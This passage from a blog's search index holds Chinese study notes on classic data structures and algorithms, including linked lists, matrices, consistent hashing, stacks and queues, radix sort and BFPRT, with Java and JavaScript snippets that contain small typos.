&#123; return null &#125; // n1是慢指针，一次走一步 // n2是快指针，一次走两步 n2 = n2.next.next n1 = n1.next &#125; // 跳出while，说明n1 = n2，n1和n2相遇 // 快指针回到开头，n1和n2都各每次走一步 n2 = head while (n1 != n2) &#123; n1 = n1.next n2 = n2.next &#125; // 再次相遇,n1 = n2 ，这个就是入环节点 return n1&#125; 12345678910111213141516171819202122232425262728293031323334353637383940// 无环链表相交问题 public static Node noLoop(Node head1, Node head2) &#123; if (head1 == null || head2 == null) &#123; return null; &#125; Node cur1 = head1; Node cur2 = head2; int n = 0; while (cur1.next != null) &#123; n++; cur1 = cur1.next; &#125; while (cur2.next != null) &#123; n--; cur2 = cur2.next; &#125; if (cur1 != cur2) &#123; return null; &#125; //n是否大于0，代表head1和head2谁更长 // cur1 代表长的 // cur2 代表返回了短的 // 此时cur1代表 cur1 = n &gt; 0 ? head1 : head2; cur2 = cur1 == head1 ? head2 : head1; // n的绝对值代表两个链表差值的步数 n = Math.abs(n); // 长的先走差值步 while (n != 0) &#123; n--; cur1 = cur1.next; &#125; // 然后两条链一起走 while (cur1 != cur2) &#123; cur1 = cur1.next; cur2 = cur2.next; &#125; // 相遇时，返回第一个相交节点 return cur1; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 有环链表相交问题 public static Node bothLoop(Node head1, Node loop1, Node head2, Node loop2) &#123; Node cur1 = null; Node cur2 = null; // loop1和loop2相等，那截掉环 // 问题就变成了无环链表的相交问题 if (loop1 == loop2) &#123; cur1 = head1; cur2 = head2; int n = 0; // 终止条件变为cur1到达第一个入环节点就不再遍历 while (cur1 != loop1) &#123; n++; cur1 = cur1.next; &#125; // 终止条件变为cur2到达第一个入环节点就不再遍历 while (cur2 != loop2) &#123; n--; cur2 = cur2.next; &#125; cur1 = n &gt; 0 ? head1 : head2; cur2 = cur1 == head1 ? head2 : head1; // 一样走差值步 n = Math.abs(n); while (n != 0) &#123; n--; cur1 = cur1.next; &#125; // 一样返回相交的位置 while (cur1 != cur2) &#123; cur1 = cur1.next; cur2 = cur2.next; &#125; return cur1; &#125; else &#123; // 共享环结构 cur1 = loop1.next; // 中途cur1遇到了loop2，随便返回一个 while (cur1 != loop1) &#123; if (cur1 == loop2) &#123; return loop1; &#125; cur1 = cur1.next; &#125; // 中途没有遇到loop2，说明两个有环的链表，是66结构 return null; &#125; &#125;]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（四）]]></title>
    <url>%2F2018%2F01%2F23%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[复制含有随机指针节点的链表题目：一种特殊的链表节点类描述如下：12345678910public class Node &#123; public int value; public Node next; public Node rand; public Node (int data) &#123; this.value = data &#125; &#125;&#125; 即本来 1 -&gt; 2 -&gt; 3 -&gt; 4 -&gt; null，但是多了个随机指针，1的random指针可能指向3，2的random指针可能指向4等等。需要：拷贝一个这样的链表的结构，并且链表上的node的random指针也要拷贝下来，并返回新的头部。 思路 思路一（使用map）： 使用哈希map，将节点克隆下来：（1，1‘）、（2，2’）、（3，3‘），并在克隆的同时，让1’的next指针指向2‘，2’的next指针指向3‘。 现在我们看各节点random指针指向谁？遍历哈希表：假设拿到（2，2’），看2的random指针指向谁，就让2’的random指针指向谁的克隆节点。 这样遍历下来，就可以设置好所有的random节点，最后返回一个1‘。 思路二（调整链表替代map，不使用额外空间）： 克隆节点，并放在老节点后面，如做成这样的结构：1 -&gt; 1’ -&gt;2 -&gt; 2’ -&gt; 3 -&gt; 3’ -&gt; null。此时1，2，3的random指向没有变化。 此时1’，2‘，3’的random指向为null。 遍历大链表 1 -&gt; 1’ -&gt;2 -&gt; 2’ -&gt; 3 -&gt; 3’ -&gt; null。拿到（1，1‘），1的random我们是知道的，假设为3。此时3的next指向3‘，我们就很容易的将1’的random指针也指向了3‘。 然后将1’，2‘，3’分离出来。利用奇数头和偶数头，遍历时奇数是老链表，偶数是新链表。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（三）]]></title>
    <url>%2F2018%2F01%2F22%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[将单向链表按某值划分成左边小、中间相等、右边大的形式题目：给定一个单向链表的头节点head，节点的值类型是整型，再给定一个整数pivot。实现一个调整链表的函数，将链表调整为左部分都是值小于pivot的节点，中间部分都是值等于pivot的节点，右部分都是值大于pivot的节点。除这个要求外，对调整后的节点顺序没有更多的要求。例如：链表 9 -&gt; 0 -&gt; 4 -&gt; 5 -&gt; 1，pivot = 3。调整后链表可以是 1 -&gt; 0 -&gt; 4 -&gt; 9 -&gt; 5，也可以是 0 -&gt; 1 -&gt; 9 -&gt; 5 -&gt; 4。总之，满足左部分都是小于3的节点，中间部分都是等于3的节点（本例中这个部分为空），右部分都是大于3的节点即可。对某部分内部的节点顺序不作要求。 思路 思路一： 3个队列。 小于放小于队列，等于放在等于队列，大于放在大于队列。 队列都倒出来连在一起。 思路二： 第一次遍历链表，找到第一个小于划分值的节点，作为一个头部。 第一次遍历链表，找到第一个等于划分值的节点，作为一个头部。 第一次遍历链表，找到第一个大于划分值的节点，作为一个头部。 第二次遍历链表，将遍历的点挂载到相应的头部后。 将这三个链表首尾相连。 链表题目oj使用容器，快；面试，工程使用内存少，空间少。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（二）]]></title>
    <url>%2F2018%2F01%2F22%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[判断一个链表是否为回文结构给定一个链表的头节点head，请判断该链表是否为回文结构题目：给定一个链表的头节点head，请判断该链表是否为回文结构，即从node级别看是不是回文。例如：1 -&gt; 2 -&gt; 1，返回true。1 -&gt; 2 -&gt; 2 -&gt; 1，返回true。15 -&gt; 6 -&gt; 15，返回true。1 -&gt; 2 -&gt; 3，返回false进阶：如果链表长度为N，时间复杂度达到O(N)，额外空间复杂度达到O(1)。 思路 思路一： 遍历链表，然后将链表放入栈中，栈中是链表的逆序。 再从头开始遍历，栈也依次弹出一个。比较，原列表遍历到结尾，栈也弹完。 每次遍历的值与栈弹出的值相同。 思路二： 慢指针一次走一步，快指针一次走两步，当快指针走完时，慢指针来到了中间位置。 将慢指针所在位置的后面的，剩余的链表压栈。 你只遍历慢指针所在位置的，前面的链表。看看这部分与压在栈中的部分是否相同。 相当于以链表中心为对折点，将链表对折，看看是否相等。 如此这般，栈就节省了一半的空间。 思路三(不使用栈结构)： 例如 1 -&gt; 2 -&gt; 3 -&gt; 2 -&gt; 1，慢指针一次走一步，快指针一次走两步找到中点3. 处理链表为 1 -&gt; 2 -&gt; 3 &lt;- 2 &lt;- 1，分别从两头开始遍历比较，如果都一样，那就是回文。 在比较的过程中，reverse的部分再reverse回来。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--链表（一）]]></title>
    <url>%2F2018%2F01%2F18%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[打印链表公共部分给定两个有序链表的头指针head1和head2，打印两个链表的公共部分 流程 从头开始看两个链表上的值，谁小就往下走一位。 相等就共同向下走一位，并打印想等值 即谁小谁动，相等就一起走。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--矩阵相关题目（三）]]></title>
    <url>%2F2018%2F01%2F18%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E7%9F%A9%E9%98%B5%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[“之”字型打印给定一个矩阵matrix，按照“之”字形的方式打印这个矩阵，例如：1 2 3 45 6 7 89 10 11 12“之”字型打印的结果为：1，2，5，9，6，3，4，7，10，11，8，12要求：额外空间复杂度为O(1)。 方案 宏观去想 从1开始建立坐标轴（x, y）。a朝x正坐标方向走，b朝y负坐标方向走。 第一次a到2，b到5，画出对角线：2，5 第二次，a到3，b向下走到9，画出对角线：3，6，9 如此这般，能得到各个对角线。 打印对角线，第一次打印从左下向右上，第二次从右上向左下，第三次从左下向右上。我们提供一个打印函数，给一个布尔值确定打印方向。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--矩阵相关题目（二）]]></title>
    <url>%2F2018%2F01%2F18%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E7%9F%A9%E9%98%B5%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在行列都排好序的矩阵中找数给定一个N * M的整型矩阵matrix和一个整数K，matrix的每一行和每一个列都是排好序的。实现一个函数，判断K是否在matrix中。例如：0 1 2 72 5 6 74 6 7 85 7 8 9如何k为7，返回true；如果k为6，返回false。 要求：时间复杂度为O(N + M)，额外空间复杂度为O(1)。 流程 假设我们寻找5 从右上角开始，从第4列着手。7是该列最小的，比5大，所以5不在该列。 向左移动一列，从第三列着手。2是该行除7外最大的，比5小，所以该行也比11小。 向下移动一行，因为6是比5大的，所以6所在列是不可能的。 所以向左移动，找到了5 显然，从右上角开始，大就向左移动，小就向下移动。 原因是：若该数比k大，则该列无可能。该数比5小，则该行无可能。所以大向左移动，小向下移动。 若是越界了，说明矩阵中没有要找的k值。 我一共最多走 M（行） + N (列)步就能找到k值，所以时间复杂度是O(N + M)。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--矩阵相关题目（一）]]></title>
    <url>%2F2018%2F01%2F16%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E7%9F%A9%E9%98%B5%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[转圈打印矩阵给定一个整型矩阵matrix，请按照转圈的方式打印它1 2 3 45 6 7 89 10 11 1213 14 15 16打印结果为：1，2，3，4，8，12，16，15，14，13，9，5，6，7，11。要求：额外空间复杂度为O(1)。 不要把视线局限在局部区域变化 1点（0，0），16点（3，3）。 列数++，到3 行数++，到3 列数–，到0 行数–，到0 关键代码12345678910111213141516171819202122232425262728293031323334353637383940414243// tR，tC，左上角的行数和列数// dR，dC，右下角的行数和列数public static void printEdge (init[][] m, int tR, int tC, int dR, int dC) &#123; // 只有一行，顺序打印 if (tR == dR) &#123; for (int i = tC; i &lt;= dC; i++) &#123; System.out.print(m[tR][i] + &quot; &quot;) &#125; &#125; else if (tC == dC) &#123; // 只有一列，按顺序打印列 for (int i = tR; i &lt;= dR; i++) &#123; System.out.print(m[i][tC] + &quot; &quot;) &#125; &#125; else &#123; int curC = tC int curR = tR // 列数不等，列数++ while (curC != dC) &#123; System.out.print(m[tR][curC] + &quot;&quot;) curC++ &#125; // 行数不等，行数++ while (curR != dR) &#123; System.out.print(m[curR][dc] + &quot;&quot;) curR++ &#125; // 列数不等，列数-- while (curC != tC) &#123; System.out.print(m[dR][curC] + &quot;&quot;) curC-- &#125; // 行数不等，行数-- while (curR != tR) &#123; System.out.print(m[curR][tC] + &quot;&quot;) curR-- &#125; &#125;&#125;// 打印完最外层后，左上角向右下方移动，右下角向左上方移动// 如此，就可以分圈结构的宏观调用// 一圈，一圈的分圈执行函数// 左上角的行大于右下角的行，或者左上角的列大于右下角的列，停止 将原矩阵顺时针转90°利用分圈结构写。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--哈希相关题目]]></title>
    <url>%2F2018%2F01%2F16%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%93%88%E5%B8%8C%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[RandomPool结构设计一种结构，在该结构中有如下三个功能：insert(key)：将某个key加入到该结构，做到不重复加入。delete(key)：将原本在结构中的某个key移除。getRandom()：等概率随机返回结构中的任何一个key。要求：Insert，delete，getRandom方法的时间复杂度是O(1)。 思考 哈希表不负责等概率的随机返回一个key，只保证每个数据域后挂载的数据链是均匀增长的。不能单纯使用哈希表。 结构设计 有两个哈希表：map1和map2。 map1负责记录数据进来的次序index。例如向map1中加入一条数据”A”，则map中存有这么一条数据：(key：A，value：0)，表示数据“A”是进入的第0个数据。 map2负责记录的数据正好与map1相反。map2的key就是0，value就是A。 即map1和map2表示从key查或者从value查都能查到这个数据。 无删除行为（只有加，没有减）等概率随机返回Index对应的数据：假设整个哈希表的大小是26，那么size对应的值就是26。random函数，传进去26，等概率的返回[0，25]中的某个随机数。用这个随机数作为index，从map2中查出返回值。 含删除行为例如[0，1000]，共1001个数。[0，999]个给删除掉了。那么按照我们上述方法去随机取值，很大概率会random到空值。所以我们能够向上述这么做的前提是，所有Index都连在一起，没有空值。 例如 map1：（a, 0），（b, 1），（c, 2），（d, 3）。map2：（0, a），（1, b），（2, c），（3, d）。 删除 “b”，怎么删？将“d”，放在原来的(b, 1)的位置上，然后删掉最后一行。 这样，我们的index区域始终连续。 关键代码12345678910111213141516171819202122232425262728293031323334// 插入public void insert (K key) &#123; // 从keyIndexMap中先查是否存在这个数 if (!this.keyIndexMap.containsKey(key)) &#123; // 不存在，就将这个数加进去 this.keyIndexMap.put(key, this.size) this.indexKeyMap.put(this.size++, key) &#125;&#125;// 随机取public K getRandom () &#123; if (this.size === 0) &#123; return null &#125; // 从indexKeyMap中随机取 randomIndex = (int)(Math.random() * this.size) return this.indexKeyMap.get(randomIndex)&#125;// 删除行为// 通过size找最后一个元素// 将要删的放最后，最后的放要删的位置，删除最后一个public void delete (K key) &#123; if (this.keyIndexMap.containsKey(key)) &#123; int deleteIndex = this.keyIndexMap.get(key) int lastIndex = --this.size K lastKey = this.indexKeyMap.get(lastIndex) this.keyIndexMap.put(lastKey, deleteIndex) this.indexKeyMap.put(deleteIndex, lastKey) this.keyIndexMap.remove(key) this.indexKeyMap.remove(lastIndex) &#125;&#125;]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--一致性哈希]]></title>
    <url>%2F2018%2F01%2F11%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%2F</url>
    <content type="text"><![CDATA[函数是哈希函数的要求 要求一：1. 你的输入域是无穷大的。例如：f(String str)，可以认为该函数的输入域是无穷大的。2. 你的输出域是有限的。大多哈希函数可以做到2^64 - 2^ 128。 为什么有这两个要求。因为现实生活中，我们想让目标数经过哈希后落到一个有限的范围内。 要求二：当输入参数一旦确定，返回值一定也确定了。即哈希函数没有随机成分，是用某种规则处理出来的信息。 输入域无限，输出域有限，输入参数确定则输出值也确定，这3点会导致，不同的输入会有相同的输出。 要求三：输入域无穷大，映射到一个较小的范围S（2^64 - 2^ 128）。我们要求：所有的输入值，映射后会均匀的摊在整个S上。例如：输出域S是0，1，2，不管你的输入值如何。如果输入是0，1，2 … 98，我们传进来99个值。则输出值是0的差不多33个，1差不多33个，2差不多33个。 我们称“要求三”是指：哈希函数的离散性，一个哈希函数设计的好不好就是看它的离散性好不好。 哈希值取模（%） 一个参数经过哈希函数F后得到一个哈希值去模（%）m。大量的参数经过哈希函数F后得到一个哈希值去%m。最终，得到的返回值会均匀分布在m - 1 上。 即哈希值在我们的S域上指均摊的，我们将S域给模上M，返回值就均摊在m - 1上。 经典缓存结构 三台服务器构成的一个服务器集群。上面存key-value形式的信息，我希望这三台服务器负载均衡。 机器分别为0，1，2。来了个信息A[key, value]。信息A经过哈希，得到的哈希值再经过一个模3。得到的模值，出来0，到机器0上；出来1，到机器1上；出来2，到机器2上。 插入的逻辑同上，查询的逻辑同理。 因为哈希函数的特性，我们的信息插入时是均匀分摊在这3台机器上的，我们的查询也是均匀分摊在这三台机器上的。所以，负载均衡。 经典缓存结构副作用 一旦加减机器，我们原来分摊在机器上的数据都需要变化。数据迁移的代价十分高。 解决方式-一致性哈希 假设哈希函数f，以下所有的操作使用的哈希函数均一致。 假设输出域0 ~ 2^128，作为一个环。0~2^128均匀分布在环上，即2^128的下一个位置是0，0的下一个位置是1。 假设有三台机器:M1，M2，M3，上面有自己的mac地址或其它专有信息。将这个信息生成一个hash值，认为该hash值代表这三台机器。 此时，这个环上有了3台机器。 在环上插值时，假设值为A。将A经过哈希得到的哈希值打在环上，哈希值在环上顺时针遇到的第一个机器便是它应该存放的地方。 此时，每个机器负责环上的某段数据。 加机器。原来是m1，m2，m3。在环上加入m4（m1，m2，m4，m3），此时不需要将所有的数据都迁移。我们将原本属于m3的部分数据，让它属于m4就可以了。 m4机器删除，此时将m4上的数据顺时针给到下一个机器m3上，就可以了。如何顺时针找机器 机器是环装结构，假设机器的哈希值分别是1，5，10。在前端，插入一个值，它的哈希值是6。那么它就可以在1-5-10中找到它的位置。 上面做法的问题 利用哈希函数的离散性，哈希在分割环时，在数据量很大的情况下，才会出现均摊。数据量小的时候，均分并不明显。 比如：有一间屋子，打翻一瓶香水，可以充满屋子。但是几个颗粒，就不能。哈希是一个类似的过程。 即便3台机器负载均衡了，在加入第四台机器时，一定会出现负载不均。 虚拟节点技术 真是机器是m1，m2，m3。但是，不使用m1，m2，m3去计算哈希值。分配虚拟路由节点，m1被分配：v1-1，v1-2，一直到v1-1000。 环上不再放3台机器计算的哈希值，而是放虚拟节点的哈希值。此时m1，m2，m3就可以通过虚拟节点均分整个环了。 加机器m4，将m4的虚拟节点的哈希值放在环上，虚拟节点会向m1，m2，m3要数据。这样数据就均摊在m1，m2，m3，m4上了。 即通过虚拟节点，尽可能的将数据均摊。 哈希表 哈希表：有一个数组[0，1，3，4，5]，数组中的5个数代表5个数据域。每个数据域连着一个链表，链表上有数据。 将一个(key，value)加入一个hashmap。value不用管，key经过hash以后会打到对应数据域上。例如（a, 31），a 经过哈希以后，再模上6。打到了数据域4上，4后面的链表就加一个节点（a, 31）。 这么一个结构。当我有大量数据打到这个[1，2，3，4，5]上。其每个数据域后面的链表因为哈希一致性的性质，链表长度能够均匀增长（数据均摊）。 hash表要扩容，增长到12，每个链表数据减半。 新结构：每个数据域后面不跟链表，而跟一个红黑树，相同哈希值根据红黑树区分不同。扩容行为更新频率低，因红黑树的有序结构。 使用哈希表的增删改查的时间复杂度都是O(1)。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--栈与队列]]></title>
    <url>%2F2018%2F01%2F09%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[问题1 实现一个特殊的栈，在实现栈的基本功能的基础上，再实现返回栈最小元素的操作。要求：1.pop、push、getMin操作的时间复杂度都是O(1)。2.设计的栈类型可以使用现成的栈结构。 代码 设计1 准备两个栈，data栈和help栈。 data栈，压入3。help栈同步压入3。 data栈，压入4。help栈同步压入3。 data栈，压入5。help栈同步压入3。 data栈，压入2。help栈同步压入2。 data栈取2，help栈弹出2。 data栈取5，help栈弹出3。 即help栈在data栈每次压入新值时，help栈同步压入当前最小值。data栈每次弹出值时，help栈同步弹出栈顶。help栈的栈顶保持是data栈中的最小值。 设计2 准备两个栈，data栈和help栈。 data栈，压入3。help栈同步压入3。 data栈，压入3。help栈同步压入3。 data栈，压入4。help栈不压。 即data栈当前压入的数，小于等于help栈栈顶时，才压入help栈。 弹出时，data栈当前弹出的数小于等于help栈栈顶时，才弹出。 问题 2 怎么用数组结构实现固定大小的栈？ 代码 设计 数组固定长度为5。size一开始是0。 在数组的size位置加一个数后，size + 1。 在数组的size位置取一个数后，size - 1。 size爆了，报错。 问题 3 怎么用数组实现固定大小的队列？ 代码 设计 有一个start变量，end变量。 一开始start和end指向同一个位置。 增加时，加一个，end指向加进来的数。后续增加的也是如此。 弹出时，减少一个，start向下移动一个。 start是去追赶end的。 start和end谁触底，回到最初位置。 size用于约束start和end，超了或者减少到底了都报错。 用size去约束start和end的行为。 问题4 如何用栈结构实现队列结构？ 代码 设计 设计一个data栈，help栈。 data栈是1，2，3，4，5。 help栈是data栈的倒置，5，4，3，2，1。 data栈进，help栈出。便构成了队列。弹出规则 如果help栈中不为空，data栈一定不要向help栈中放置数据。 data栈向help栈放元素，一定要将data栈自己所有的元素倒完。 问题5 如何用两个队列实现栈？（一个图的深度遍历，怎么用队列实现？其实用队列做成栈，然后用栈做深度遍历即可）。 代码 设计 例如有队列A中有 1，2，3，4，5 弹出时，让2，3，4，5进入另一个队列B，队列A仅剩数字1，弹出1。 现在队列B有 2，3，4，5，队列A空。 队列B 3，4，5进入队列A。队列B中剩下2，弹出。 这就是栈。 这里有个小技巧是swap了A和B引用指向的对象。 问题6实现一种狗猫队列的结构，要求如下:用户可以调用add方法将cat类或dog类的实例放入队列中;用户可以调用pollAll方法，将队列中所有的实例按照进队列的先后顺序依次弹出;用户可以调用pollDog方法，将队列中dog类的实例按照进队列的先后顺序依次弹出;用户可以调用pollCat方法，将队列中cat类的实例按照进队列的先后顺序依次弹出;用户可以调用isEmpty方法，检查队列中是否还有dog或cat的实例;用户可以调用isDogEmpty方法，检查队列中是否有dog类的实例;用户可以调用isCatEmpty方法，检查队列中是否有cat类的实例。 简单设计 狗进狗队列，猫进猫队列 狗的定义改一下，加一个index属性，标注它是第几个进的。猫同理。 整体弹最早的狗或者猫，就比较他们的position。 关键在于，我们不能修改上级的数据结构。 所以，我们定义自己进队列的类。PetEnterQueue，这个类将宠物类封装进去，并增加一个计数项 count。不管进狗还是进猫，count都 ++ 。 因此，我们的猫狗队列不再封装简单的猫狗对象，而且宠物队列对象。 这样我们就可以判断猫或者狗在一起弹的时候谁更早一点。 不正确的设计 用hashmap记录猫狗进队列，用key,value来做。 但是同一只宠物，进队列怎么办？ 比如先给第一只猫喂水，再给第二只喂水。然后再给第一只喂水。用map，下一次第一只猫进来的时候，原来的key就丢掉了。 而上面的方法封装的是自己实现的一个新对象，可以区分同一个宠物多次进队列的情况。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--基数排序（待续）]]></title>
    <url>%2F2018%2F01%2F04%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95-%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基数排序 假设有 5，23，31， 15， 100。 按照最高位补0，005，023，031，015，100。 准备9个桶。0，1，2，3，4，5，6，7，8，9。 按照个位，放入桶。 0桶：100。 1桶：031。 3桶：023。 5桶：015，005。（先进先出） 从0号桶依次倒出：100，031，023，005，015。 按十位进桶，再倒出。 按百位进桶，再倒出。 排序完成。 先排低位再排高位，入桶出桶就排完了。 流程改进例如：以374十位上的7为参照，小于等于它的有17个。那么它在十位上的排序为第17位。 关键代码]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--BFPRT]]></title>
    <url>%2F2018%2F01%2F02%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95-BFPRT%2F</url>
    <content type="text"><![CDATA[BFPRT在数组中，求第k小的数？或者求第k大的数。 各个方法优劣分析 如果对数组中的数排序求解，时间复杂度是O(N * logN)。而我们希望的时间复杂度是O(N)。 原始流程：利用快排partition的过程，比p小的放左边，和p相等的放中间，比p大的放右边。如果相等的部分命中k，那么得出答案。如果未命中，那么看k是在P的部分。这个过程平均下来的时间复杂度是O(N)。 BFPRT：快排的划分值P是随机选的，而BFPRT的算法划分值的选择并不是随机的。 BFPRT如何选择划分值的 相邻的5个数是一组，后面不足5个数的单独一组。 O(1)。 在一个组的内部，把数排序，排好。组内排序，组与组之间不排序。因为一个组5个数排序，时间复杂度O(1)。有 N / 5 组，所以这个过程 O(1) * N / 5。即时间复杂度是O(N)。 因为一个组中，数是有序的。我们可以很方便的得到组内的上中位数。（奇数：无上中位数。偶数：例如1234，上中位数是2，下中位数是3）。所以，组内的中位数是第3个数。将每个组的上中位数拿出来组成一个数组newArr，这个数组的大小是N / 5，它的上中位数是第 N / 10 小的数。我们的题要求，求第k小的数，用函数表达为f(arr, k)。自己调用自己求newArr的上中位数，即f(newArr, N / 10)，可以求出newArr的第 N / 10小的数。 总结一下，分组后拿出组内的上中位数组成一个新的数组，再求新数组的上中位数。 将新数组中的上中位数拿去做划分值，做partion过程，看=P的范围是否命中K。没命中，继续递归。 为什么时间复杂度是O(N) 随机划分值，做partion的过程，我们不能确定P部分递归的大小。这个规模你是无法保证。 在新数组中，第 N / 10 位置的数，假设为M。组内中位数组成的新数组的中位数是第 N / 10 位置的数，即至少有 N / 10 个数比M小。 而在原来的每5个位一组的小数组中。某个小数组的中位数比第 N / 10位置上的数小，这个小数组的中位数下，还有2个数也比第 N / 10 位置上的数小。即最少有 3N / 10 个数比M要小。即最多有 7N/10 个数比M大。 对于M来说，最多有 7N/10 个数比它大。 M又是作为partion过程的划分值的，即我们&gt;P过程的递归规模是可以确定的。 即我们可以确定的淘汰掉一定规模的数，因此我们的递归规模收敛到O(N)。 第一步：分组，每5个位一组，O(1)。第二步：组内排序，O（N）。第三步：自己调用自己。原过程递归是T(N)规模，自己调用自己是T（N / 5）的规模，因为新数组的规模是原来数组的1 / 5。第四步：partion，O（N）。第五步：只走一侧递归，最大递归规模是T（7N / 10）。所以整个复杂度是：O(1) + O（N）+ T（N / 5）+ O（N）+ T（7N / 10），这个式子可以收敛到O(N)。 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142function getMinKthByBFPRT (arr, K) &#123; let copyArr = copyArray(arr) // 主流程 return select(copyArr, 0, copyArr.length - 1, K - 1)&#125;// 给定一个数组，给定一个范围[begin, end]，求第i小的数function select (arr, begin, end, i) &#123; if (begin === end) &#123; return arr[begin] &#125; // 求划分值M int pivot = medianOfMedians(arr, begin, end) // 利用求出的划分值去Partition，返回 =M 的区域。 let pivotRange = partition(arr, begin, end, pivot) // 看我们第i小的数是否命中了pivotRange这个区域 if (i &gt;= pivotRange[0] &amp;&amp; i&lt;= pivotRange[1]) &#123; return arr[i] // 如果没命中 = M 区域，那么或者走左边，或者走右边 &#125; else if (i &lt; pivotRange[0]) &#123; return select(arr, beigin, pivotRange[0] - 1, i) &#125; else &#123; return select(arr, pivotRange[1] + 1, end, i) &#125;&#125;// 在一个数组中求划分值Mfunction medianOfMedians (arr, begin, end) &#123; // 在[begin, end]的范围内，有多少个数 let num = end - begin + 1 // 是否有剩余数构成一组 let offset = num % 5 === 0 ? 0 : 1 // 数组mArr是各个组的中位数组成的新数组 let mArr = new Array(num/5 + offset) // for循环每5个数为一组，并排序。从每组中取中位数放入新数组中。 for (int i = 0; i &lt; mArr.length; i++) &#123; let beginI = begin + i * 5 let endI = beginI + 4 mArr[i] = getMedian(arr, beginI, Math.min(end, endI)) &#125; // 新数组递归的调用select求数组自己的上中位数 return select(mArr, 0, mArr.length - 1, mArr.length / 2)&#125;]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典算法--Manacher]]></title>
    <url>%2F2017%2F12%2F27%2FJavaScript%E7%BB%8F%E5%85%B8%E7%AE%97%E6%B3%95-Manacher%2F</url>
